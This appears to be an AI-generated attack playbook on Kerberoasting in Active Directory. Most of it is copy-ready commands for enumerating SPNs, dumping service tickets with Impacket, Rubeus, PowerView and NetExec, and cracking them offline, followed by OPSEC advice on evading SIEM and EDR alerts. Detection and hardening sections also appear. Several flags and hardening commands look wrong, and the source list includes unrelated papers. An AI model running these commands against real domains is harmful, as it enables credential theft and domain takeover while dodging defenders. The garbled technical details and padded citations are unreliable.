---
title: "Attack #2 — Kerberoasting"
description: "Kerberoasting is a post-compromise, offline credential attack that abuses a fundamental design feature of the Kerberos protocol. When any authenticated…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "kerberos", "privilege-escalation", "sql-injection", "hashing"]
tools: ["NetExec", "Impacket", "Rubeus", "BloodHound", "Kerbrute"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #2 — Kerberoasting.md"
---
# 🔴 Attack #2 — Kerberoasting

***

## 📖 How It Works

Kerberoasting is a **post-compromise, offline credential attack** that abuses a fundamental design feature of the Kerberos protocol. When any authenticated domain user requests a Ticket Granting Service (TGS) ticket for a Service Principal Name (SPN), the Domain Controller hands back that ticket **encrypted with the RC4 or AES hash of the service account's password**. The attacker requests that ticket, extracts the encrypted blob, takes it completely offline, and cracks it with Hashcat or John the Ripper — **no lockout, no noise, no network traffic during cracking**.

The critical vulnerability is that **any domain user can request a TGS for any SPN** — no special privileges required. Service accounts (SQL, IIS, backup agents, etc.) are the primary targets because they frequently run with high privileges, rarely have their passwords rotated, and are often set with weak passwords that predate modern password policy enforcement.

### The Full Attack Flow

```
1. Attacker obtains ANY valid domain user credentials (e.g., via Password Spraying)
2. Queries AD for all user accounts with an SPN set (servicePrincipalName attribute)
3. Requests TGS ticket(s) for each SPN from the KDC — this is LEGITIMATE Kerberos behaviour
4. Extracts the encrypted hash from the TGS ticket ($krb5tgs$23$... format for RC4)
5. Runs offline cracking with Hashcat/John against wordlists + rules
6. Recovers plaintext password → authenticates as high-privilege service account
```

The attack is dangerous precisely because **step 3 is indistinguishable from normal authentication**. A legitimate user requesting a TGS for MSSQL looks identical to an attacker doing the same thing.

> ⚠️ **Windows Server 2022+ Behaviour:** Windows Server 2022 and later enforce Kerberos armoring (FAST) by default, which can complicate roasting. Additionally, newer environments are more likely to use AES-256 exclusively, making RC4 downgrade attacks harder. Always check the target's supported encryption types before committing to cracking; AES256 hashes take significantly longer to crack than RC4.

**Chains with:** Attack #1 (Password Spraying for initial credentials), Lateral Movement (using recovered service account), DCSync (if service account has replication rights), Golden Ticket creation (if KRBTGT hash obtained).

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain user account** | Any valid low-privilege domain user is sufficient — no admin rights needed |
| **SPN-linked user accounts** | Target domain must have service accounts with SPNs (virtually universal) |
| **RC4 not disabled** | If AES-only is enforced, hash is harder but still crackable (AES128/256) |
| **Network access to DC** | Need to reach port 88 (Kerberos) or 389 (LDAP) on the DC |
| **Offline cracking rig** | GPU-accelerated Hashcat strongly preferred for time efficiency |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Impacket — GetUserSPNs.py** | Linux | Most common Linux tool; requests + dumps TGS hashes in one command |
| **Rubeus** | Windows | Best Windows tool; supports RC4 downgrade, OPSEC mode, roast-all |
| **PowerView — Invoke-Kerberoast** | Windows | PowerShell; integrates cleanly into recon pipeline |
| **BloodHound** | Both | Enumerates Kerberoastable accounts graphically; shows path to DA |
| **Hashcat** | Linux/Windows | GPU-accelerated; mode `-m 13100` for RC4, `-m 19600/19700` for AES |
| **John the Ripper** | Linux | CPU-based alternative; good for quick cracks on small wordlists |
| **CrackMapExec / NetExec** | Linux | Can enumerate and dump SPNs with `--kerberoasting` flag |
| **Kerbrute — userenum for SPNs** | Linux | Can enumerate SPN accounts directly via Kerberos |
| **ldapsearch** | Linux | Direct LDAP query to find servicePrincipalName attributes (pre-roasting reconnaissance) |

***

## 💻 Full Commands

### 🔵 Step 0 — Enumerate SPN Accounts First

```bash
# Linux — enumerate all accounts with SPNs (unauthenticated check)
ldapsearch -x -H ldap://10.10.10.10 -D "corp\low_user" -w 'Password1' \
  -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Windows — PowerShell with AD module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | \
  Select-Object SamAccountName, ServicePrincipalName

# Windows — PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName, Description, MemberOf

# Count high-value roastable accounts (Domain Admins with SPN)
Get-ADGroupMember -Identity "Domain Admins" | Get-ADUser -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null}
```

***

### 🔴 Impacket — GetUserSPNs.py (Linux — Primary Tool)

```bash
# Enumerate SPN accounts (no ticket request yet)
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# Request and dump ALL TGS hashes in one shot
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request

# Output hashes directly to file for cracking
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt

# Target a SINGLE specific SPN account
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request-user svc_sql

# Using NTLM hash instead of plaintext password (Pass-the-Hash style)
GetUserSPNs.py corp.local/low_user -hashes :a87f3a337d73085c45f9416be5787d86 -dc-ip 10.10.10.10 -request

# Using Kerberos ticket (ccache) authentication
export KRB5CCNAME=/tmp/user.ccache
GetUserSPNs.py corp.local/low_user -k -dc-ip 10.10.10.10 -request

# Force RC4 downgrade (requests weaker hash, cracks faster)
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request -no-preauth
```

> **Hash format you'll see:** `$krb5tgs$23$*svc_sql$CORP.LOCAL$...` → `23` = RC4 (fast to crack), `18` = AES256 (slower).

***

### 🔴 Rubeus — Windows (Most Feature-Rich)

```powershell
# Roast ALL kerberoastable accounts (dump hashes to console)
.\Rubeus.exe kerberoast

# Output to file in hashcat format
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target a single user account
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash

# Force RC4 downgrade (etype:23) — faster to crack than AES
.\Rubeus.exe kerberoast /tgtdeleg /etype:rc4

# OPSEC-safe mode — roasts one at a time with delay to avoid bulk detection
.\Rubeus.exe kerberoast /nowrap /nopac

# Use existing TGT from memory (avoids new auth event)
.\Rubeus.exe kerberoast /ticket:<base64_TGT>

# Enumerate only — no ticket requests (just list SPNs)
.\Rubeus.exe kerberoast /stats

# Targeted roasting — only Domain Admin accounts with SPN
.\Rubeus.exe kerberoast /ldapfilter:"(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" /outfile:da_hashes.txt
```

***

### 🔴 PowerView — Invoke-Kerberoast (Windows)

```powershell
Import-Module .\PowerView.ps1

# Basic roast — output hashes
Invoke-Kerberoast | fl

# Output in Hashcat format (most common)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ascii hashes.txt

# Output in John format
Invoke-Kerberoast -OutputFormat John | Select-Object -ExpandProperty Hash | Out-File -Encoding ascii hashes_john.txt

# Filter for high-value targets only (Domain Admins group members with SPN)
Invoke-Kerberoast -Identity "Domain Admins" | fl

# Target specific service accounts by description or name
Invoke-Kerberoast | Where-Object {$_.ServiceName -like "*SQL*" -or $_.ServiceName -like "*backup*"}
```

***

### 🔴 NetExec — Linux (Quick Sweep)

```bash
# Kerberoast with authenticated user
nxc ldap 10.10.10.10 -u low_user -p 'Password1' --kerberoasting hashes.txt

# Via Kerberos auth (using ccache ticket)
export KRB5CCNAME=/tmp/user.ccache
nxc ldap 10.10.10.10 --use-kcache --kerberoasting hashes.txt

# Enumerate SPNs only (no roasting)
nxc ldap 10.10.10.10 -u low_user -p 'Password1' --query "SELECT sAMAccountName,servicePrincipalName FROM users WHERE servicePrincipalName IS NOT NULL"
```

***

### 🔴 Targeted Roasting — High-Value Accounts Only

```bash
# Impacket — roast only Database-related SPNs
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request | grep -i 'mssql\|oracle\|postgres'

# PowerShell — roast only service accounts in privileged groups
Import-Module .\PowerView.ps1
$da_members = Get-ADGroupMember -Identity "Domain Admins"
foreach ($member in $da_members) {
    if ((Get-ADUser $member -Properties ServicePrincipalName).ServicePrincipalName) {
        Invoke-Kerberoast -Identity $member.SamAccountName -OutputFormat Hashcat
    }
}

# Bash — targeted roast by SPN pattern (SQL Server accounts)
for user in $(ldapsearch -x -H ldap://10.10.10.10 -D "corp\user" -w pass -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*MSSQL*))" sAMAccountName | grep sAMAccountName); do
    GetUserSPNs.py corp.local/user:'pass' -dc-ip 10.10.10.10 -request-user "$user" >> targeted_hashes.txt
done
```

***

### 🔴 Offline Cracking — Hashcat

```bash
# RC4 hash cracking (mode 13100) — most common scenario
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# With best rules (dramatically increases hit rate)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With d3ad0ne rules (aggressive, high coverage)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# AES128 cracking (mode 19600)
hashcat -m 19600 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AES256 cracking (mode 19700) — slower, may need GPU
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -w 3

# Brute-force mask attack (corporate passwords like Pass2024!)
hashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s

# John the Ripper alternative (CPU-based, slower)
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --format=krb5tgs kerberoast_hashes.txt --show

# Hybrid attack: combine dictionary + rules (best results for service accounts)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule -w 3
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **`KDC_ERR_ETYPE_NOSUPP`** | Domain enforces AES-only; RC4 downgrade not supported. | Switch to hashcat mode `-m 19600` (AES128) or `-m 19700` (AES256). RC4 may not be available; ask for AES wordlists/rules. |
| **`No SPNs found`** | Domain has no service accounts with SPNs, or query failed. | Verify credentials are correct. Run LDAP query manually: `ldapsearch ... "(servicePrincipalName=*)"`. If truly no SPNs, try AS-REP roasting instead. |
| **`TGS request failed: KDC_ERR_S_PRINCIPAL_UNKNOWN`** | Specified SPN doesn't exist or user account doesn't have that SPN set. | Enumerate SPNs first: `GetUserSPNs.py corp.local/user:pass -dc-ip IP` (no `-request` flag). Verify exact SPN name. |
| **`Hashcat crashes on mode 19700 (AES256)`** | Insufficient GPU memory or driver issues. | Reduce wordlist size, use CPU (`--workload-profile=1`), or use John the Ripper instead. |
| **`Hash format unrecognized by Hashcat`** | Hash was extracted in wrong format (e.g., John format instead of Hashcat). | Convert using Rubeus `/outfile` flag or PowerView `-OutputFormat Hashcat`. Ensure hash starts with `$krb5tgs$`. |
| **`Cannot crack RC4 hash on wordlist`** | Weak wordlist or missing rules. | Use rules: `d3ad0ne.rule`, `best64.rule`, or `dive.rule`. Add custom dictionary with service account naming patterns (e.g., `Svc`, `Service`, `Account`). |
| **`Event 4769 spam detected in logs`** | Roasted too many accounts at once; now flagged by EDR. | Use Rubeus `/tgtdeleg` flag or PowerView (which is stealthier). Roast one account at a time with 5–10 second delays between requests. |
| **`Kerberos ticket expired before cracking`** | Took too long to crack offline; TGS has lifetime limits. | Use Hashcat (faster) instead of John. If cracking takes hours, request new ticket and resume cracking on that new ticket. Tickets typically last 10 hours. |

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log | TGS ticket requested — **flag `TicketEncryptionType = 0x17` (RC4)** on modern AES-only domains |
| **4769** | Security Log | Multiple TGS requests from a **single account in a short window** targeting different SPNs |
| **4768** | Security Log | TGT requested just before a burst of 4769 events |
| **4771** | Security Log | Pre-auth failure — attacker testing account before roasting |
| **Sysmon Event 3** | Sysmon Log | Network connection — roasting tool making outbound Kerberos requests (port 88) |
| **Sysmon Event 10** | Sysmon Log | Process access — credential extraction tools accessing LSASS after obtaining credentials |

**Primary detection signature:** Event 4769 with `EncryptionType: 0x17` (RC4-HMAC) in a domain that enforces AES is a near-certain Kerberoasting indicator. If RC4 is still enabled domain-wide, detect via **volume** — one user requesting 5+ TGS tickets across different service accounts within a 60-second window is anomalous.

### Sysmon Rules
- **Event ID 3 (Network Connection):** Flag any process opening port 88 (Kerberos) to multiple DCs in rapid succession.
- **Event ID 1 (Process Creation):** Monitor for Rubeus, Kerbrute, GetUserSPNs execution from non-standard paths (user AppData, temp folders).

### Sigma Rules
- `win_kerberoasting_spn_request_rate` — detects bulk TGS requests (4769) from single source
- `win_kerberoasting_encryption_type_mismatch` — flags RC4 requests on AES-only domains
- `win_kerberoasting_suspicious_process` — monitors for known roasting tools (Rubeus, Impacket)
- `win_spn_enumeration` — detects LDAP queries for servicePrincipalName attribute

### EDR-Specific Detections

**Microsoft Defender for Identity:**
- "Suspected Kerberoasting attack" alert when 5+ 4769 events in 1 minute from single account.
- Flag RC4 TGS requests on modern domains that should use AES.
- Monitor for AS-REQ followed by rapid TGS requests (pattern of roasting).

**CrowdStrike Falcon:**
- ProcessRollup2 events for Rubeus, GetUserSPNs, Impacket execution.
- NetworkConnection events to DC on port 88 from unusual processes (PowerShell, Python, cmd).
- Alert on Kerberos SPN enumeration patterns via LDAP.

**Elastic Security (EDR):**
- Process execution: Flag Rubeus.exe, GetUserSPNs.py, impacket execution.
- Authentication events: Watch for Event 4769 volume spikes (normal = 1–2/min, attack = 10+/sec).
- Kerberos ticket events: Detect RC4 requests on AES-only systems.

### Hardening Commands

```powershell
# 1. Disable RC4 encryption for Kerberos (force AES-256) — most effective mitigation
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "KerberosEncryptionLevel" -Value 4

# 2. Require Kerberos pre-authentication for all service accounts (prevents AS-REP roasting)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Set-ADUser -DoesNotRequirePreAuth:$false

# 3. Enable Kerberos Armoring (FAST) — complicates roasting on modern DCs
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Kerberos\Parameters" -Name "KDCBasedAuthenticationArmoringRequired" -Value 1

# 4. Rotate service account passwords quarterly (limits crack window)
# Set reminder via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Password Policy
Set-ADDefaultDomainPasswordPolicy -MaxPasswordAge 90

# 5. Use managed service accounts (gMSA) with automatic password rotation
New-ADServiceAccount -Name svc_sql -DNSHostName corp.com -AccountPassword (New-Object System.Security.SecureString)

# 6. Enable "Audit Sensitive Privilege Use" — monitors who requests TGS tickets
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# 7. Monitor Event 4769 specifically for RC4 TGS requests
# Create custom alert rule in your SIEM for: EventID=4769 AND TicketEncryptionType=0x17 in AES-only domain

# 8. Remove unnecessary SPNs from high-privilege accounts (e.g., Domain Admins)
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and memberOf -RecursiveMatch "CN=Domain Admins,CN=Users,DC=corp,DC=local"} | Set-ADUser -Clear ServicePrincipalName
```

***

## 🎯 OPSEC Tips

### OpSec Ranking: Stealthiest to Loudest
1. **Rubeus /tgtdeleg /stats** — Stealthiest; only enumerates, doesn't request tickets
2. **PowerView Invoke-Kerberoast** — Very stealthy; in-memory operation, fewer 4769 events
3. **Impacket GetUserSPNs (single target)** — Moderately stealthy; requests one TGS at a time
4. **Impacket GetUserSPNs (all targets)** — Noisy; mass 4769 event generation visible in SIEM
5. **Rubeus kerberoast /all** — Loudest; generates 5+ 4769 events per second, instant SIEM alert

### Modern Defence Impact
- **Windows Server 2022+ Kerberos Armoring (FAST):** Makes ticket encryption stronger, complicates but doesn't prevent roasting. AES-256 hashes still crackable offline.
- **AES-256 Enforcement:** Dramatically increases crack time (GPU: hours→days, CPU: days→weeks). RC4 is 50–100x faster to crack than AES-256.
- **Defender for Identity:** Actively alerts on bulk 4769 events (4769 volume > 5 in 60 sec). Use Rubeus `/tgtdeleg` or one-at-a-time roasting with 10+ second delays.
- **Windows 2025 Credential Guard:** If enabled, limits plaintext credential usage even if you crack the hash. Focus on token impersonation + lateral movement instead.

### Core OpSec Rules
- **Request tickets one at a time** with delays — bulk TGS requests (10+ in seconds) trigger modern SIEM rules
- **Use `/tgtdeleg` in Rubeus** — uses delegation TGT to avoid a new AS-REQ event in logs
- **Target only high-value SPNs** — roasting everything makes noise; be selective with `svc_sql`, `svc_backup`, `svc_iis`
- **Prioritise RC4 hashes** — if AES-only enforcement is NOT in place, force RC4 downgrade for faster cracking
- **Crack offline on your own machine** — never run Hashcat on the compromised host
- **Use `--nowrap` in Rubeus** — prevents long base64 lines from being wrapped and corrupting hashes
- **Avoid requesting Domain Admins with SPN** — these accounts are always heavily monitored; target lower-value svc accounts first

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Observed in | Platforms | Data Sources |
|---|---|---|---|---|---|
| **Credential Access** | T1558 | T1558.003 (Kerberoasting) | Wizard Spider, FIN7, APT29, Lazarus | Windows, Active Directory | Authentication Logs (4769), Network Traffic, Process Monitoring |
| **Credential Access** | T1110 | T1110.001 (Password Guessing) | Various | Windows | Hashcat/John Process, File Access |
| **Privilege Escalation** | T1134 | T1134.005 (Token Impersonation) | APT3, Wizard Spider | Windows | Process Monitoring, Token Creation |
| **Discovery** | T1087 | T1087.002 (Domain Account Discovery) | Wizard Spider, FIN7 | Windows, Active Directory | LDAP Queries, Network Traffic (port 389) |
| **Collection** | T1040 | T1040 (Network Sniffing) | Multiple | Windows | Network Traffic Capture |

**Data Sources to Monitor:**
- Authentication logs (4769 for TGS requests, 4771 for pre-auth failures)
- Process execution (Rubeus.exe, GetUserSPNs.py, hashcat, john)
- Network traffic on ports 88 (Kerberos), 389 (LDAP)
- Kerberos event logs (TicketEncryptionType field)
- File access (hash output files, wordlists)

***

## 🔗 Attack Chain Context

```
[Kerberoasting] ──→ Plaintext Service Account Password Recovered
         │
         ├──→ 🔑 Authenticate as svc_sql / svc_backup / svc_iis
         ├──→ 🩸 DCSync (if svc account has Replication-Get-Changes ACE)
         ├──→ 🎫 Golden Ticket (if KRBTGT hash obtained from DCSync)
         ├──→ 🦟 Lateral Movement — svc accounts often have local admin on servers
         ├──→ 🔓 Access databases, file shares, or backup systems directly
         └──→ 🔍 Check BloodHound for ACL edges from svc account → DA path
```

**High-value Kerberoastable targets to prioritise:**
- `svc_sql` → SQL Server service account → often local admin on multiple DB servers
- `svc_backup` → Veeam/Backup Exec → usually has read access to all data
- `svc_iis` → Web application service → may have access to config files with credentials
- Any account in **Domain Admins** with an SPN set → immediate game over if cracked

***

> ✅ **Attack #2 — Kerberoasting complete.** Tell me to move on when you're ready for **Attack #3 — AS-REP Roasting**.

Sources
 What Is Kerberoasting? Attack Explained and How It Works https://www.strongdm.com/what-is/kerberoasting
 What is a Kerberoasting Attack? https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/
 An Expert Guide to Combating Kerberoasting in Active Directory https://www.fox-it.com/be/defending-your-directory-an-expert-guide-to-combating-kerberoasting-in-active-directory/
 Kerberoasting Attack – Detection and Prevention Strategies - Netwrix https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/kerberoasting/
 From Heuristics to Histograms: Reinventing… | BeyondTrust https://www.beyondtrust.com/blog/entry/kerberoasting-detections
 The Attacker's Active Directory Playbook: How to read it & How to ... https://istrosec.com/blog/the-attackers-active-directory-playbook--1-how-to/
 Active Directory Kerberoasting Attack: Monitoring and Detection Techniques http://www.scitepress.org/DigitalLibrary/Link.aspx?doi=10.5220/0008955004320439
 What Is A Kerberoasting Attack? | IBM https://www.ibm.com/think/topics/kerberoasting
 What is Kerberoasting Attack? https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-is-kerberoasting-attack/
 What is Kerberoasting? Attack and Security Tips Explained https://www.vaadata.com/blog/what-is-kerberoasting-attack-and-security-tips-explained/
 What is a Kerberoasting Attack? Detect & Prevent - Rapid7 https://www.rapid7.com/fundamentals/kerberoasting-attack/
 Microsoft's guidance to help mitigate Kerberoasting https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
 What Is a Kerberoasting Attack? - Picus Security https://www.picussecurity.com/resource/blog/kerberoasting-attack-explained-mitre-attack-t1558.003
 Steal or Forge Kerberos Tickets: Kerberoasting - MITRE ATT&CK® https://attack.mitre.org/techniques/T1558/003/
 DFIR Breakdown: Kerberoasting https://www.cybertriage.com/blog/dfir-breakdown-kerberoasting/
 What is a Kerberoasting Attack + How to Detect It - Vectra AI https://www.vectra.ai/modern-attack/attack-techniques/kerberoasting
 Active Directory Kerberoasting Attack: Detection using Machine Learning Techniques https://www.scitepress.org/DigitalLibrary/Link.aspx?doi=10.5220/0010202803760383
 CVE-driven Attack Technique Prediction with Semantic Information Extraction and a Domain-specific Language Model https://arxiv.org/abs/2309.02785
 Multi-Objective GAN-Based Adversarial Attack Technique for Modulation Classifiers https://ieeexplore.ieee.org/document/9756577/
 From Threat Reports to Continuous Threat Intelligence: A Comparison of Attack Technique Extraction Methods from Textual Artifacts https://arxiv.org/abs/2210.02601
 Kerberoasting: Case Studies of an Attack on a Cryptographic Authentication Technology https://www.crimrxiv.com/pub/nbc8gae2
 Towards Effective Identification of Attack Techniques in Cyber Threat Intelligence Reports using Large Language Models https://dl.acm.org/doi/10.1145/3701716.3715469
 Prompt Injection attack against LLM-integrated Applications https://arxiv.org/abs/2306.05499
 A robust intelligent zero-day cyber-attack detection technique https://link.springer.com/10.1007/s40747-021-00396-9
 Great, Now Write an Article About That: The Crescendo Multi-Turn LLM Jailbreak Attack https://arxiv.org/abs/2404.01833
 Detecting Forged Kerberos Tickets in an Active Directory Environment https://arxiv.org/ftp/arxiv/papers/2301/2301.00044.pdf
 Replay Attack Prevention in Kerberos Authentication Protocol Using
  Triple Password https://arxiv.org/pdf/1304.3550.pdf
 Keyboard Data Protection Technique Using GAN in Password-Based User Authentication: Based on C/D Bit Vulnerability https://www.mdpi.com/1424-8220/24/4/1229/pdf?version=1707988631
 Keyboard Data Protection Technique Using GAN in Password-Based User Authentication: Based on C/D Bit Vulnerability https://pmc.ncbi.nlm.nih.gov/articles/PMC10891990/
 Fault-enabled chosen-ciphertext attacks on Kyber https://zenodo.org/record/5718027/files/Fault-Enabled%20Chosen-Ciphertext%20Attacks%20on%20Kyber.pdf
 Attacking the Diebold Signature Variant -- RSA Signatures with
  Unverified High-order Padding https://arxiv.org/pdf/2403.01048.pdf
 Meltdown https://arxiv.org/pdf/1801.01207.pdf
 Preventing Attacks on Wireless Networks Using SDN Controlled OODA Loops and Cyber Kill Chains https://www.mdpi.com/1424-8220/22/23/9481/pdf?version=1670150837
